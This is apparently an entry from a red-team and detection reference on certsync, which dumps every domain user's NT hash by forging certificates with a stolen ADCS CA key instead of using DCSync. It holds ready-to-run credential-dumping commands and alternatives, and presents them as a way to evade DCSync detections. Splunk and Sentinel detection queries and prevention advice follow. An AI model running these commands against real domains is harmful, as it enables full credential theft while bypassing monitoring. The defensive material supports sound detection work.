name: certsync - NTDS Dump via ADCS (No DRSUAPI)
description: certsync dumps NTDS secrets without using DRSUAPI (DCSync). It enumerates users via LDAP, retrieves the CA certificate and private key, forges certificates for each user, then uses PKINIT + UnPAC-the-hash to recover NT hashes. This evades DCSync-focused detections and works even where replication is monitored or restricted.
notes:
=== REQUIREMENTS ===
  # Access to the CA private key (e.g. via Certipy -backup, or ESC chain, or admin on CA)
  # Or run the full flow if you can extract the CA key

=== DUMP NTDS WITHOUT DCSYNC ===
  certsync -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -ns <dc_ip>

=== PROVIDE CA KEY/CERT EXPLICITLY ===
  certsync -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -ns <dc_ip> \
    -ca-pfx ca.pfx

=== HOW IT WORKS ===
  1. LDAP: enumerate all domain users + their SIDs
  2. Retrieve CA cert + private key (from CA host or backup)
  3. For each user: forge a client-auth certificate
  4. PKINIT with the forged cert to get a TGT
  5. UnPAC-the-hash: extract the NT hash from the PAC
  # Result: NT hashes for all users, no replication (DRSUAPI) call

=== ALTERNATIVES ===
  secretsdump.py @dc  # classic DCSync (DRSUAPI) - more detectable
  certipy ca -backup  # grab the CA key first
  ntdsutil / ntds.dit + VSS  # on-host DB copy

recommended.note: Classic DCSync via DRSUAPI - more detectable alternative.
Certipy backs up the CA key certsync needs.

defense.why_it_works: With the CA private key, an attacker can forge authentication certificates for any user, then exchange them for TGTs via PKINIT and recover NT hashes from the PAC (UnPAC-the-hash) - obtaining credentials without the DRSUAPI replication call that DCSync detections watch.
defense.prerequisites: The ADCS CA private key (via CA host compromise, Certipy -backup, or an ESC misconfiguration); LDAP read; network to DC and CA.
defense.impact: Full domain credential compromise (all NT hashes) while bypassing DCSync detection.
defense.detection: [MITRE T1003.006/T1649] Burst of certificate issuance / PKINIT (4768 with certificate pre-auth) for many distinct users from one host; CA private key access/export; absence of the usual 4662 DRSUAPI replication pattern.
defense.artifacts: Many Kerberos AS-REQ with PKINIT for distinct principals in a short window; CA audit events for key export; forged certs not issued through normal enrollment.
defense.splunk_spl:
index=windows EventCode=4768 CertIssuerName=*
| bin _time span=5m
| stats dc(TargetUserName) as users by _time, IpAddress
| where users > 10
defense.sentinel_kql:
SecurityEvent
| where EventID == 4768 and isnotempty(CertIssuerName)
| summarize Users=dcount(TargetUserName) by IpAddress, bin(TimeGenerated, 5m)
| where Users > 10
defense.prevention: Protect the CA private key (HSM, restrict CA admin); monitor CA key export; enable strong certificate mapping (KB5014754); audit certificate issuance; treat CA servers as Tier-0.

detections.name: Mass PKINIT authentication (certsync / cert forgery)
detections.logic:
index=windows EventCode=4768 CertIssuerName=*
| bin _time span=5m
| stats dc(TargetUserName) as unique_users values(TargetUserName) as users by _time, IpAddress
| where unique_users > 10
detections.false_positives: Smartcard mass-logon events in high-assurance environments
detections.tuning: Baseline normal PKINIT volume; alert on single-source many-user bursts
